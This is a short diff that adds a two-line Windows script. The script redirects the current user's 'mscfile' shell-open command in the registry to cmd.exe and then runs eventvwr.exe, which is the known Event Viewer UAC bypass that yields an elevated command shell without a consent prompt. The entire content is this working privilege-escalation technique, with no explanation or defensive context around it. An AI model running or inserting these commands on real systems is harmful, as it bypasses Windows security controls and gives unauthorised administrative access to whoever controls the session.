@@ -1,0 +1,2 @@
+reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "cmd.exe" /f 
+eventvwr.exe 
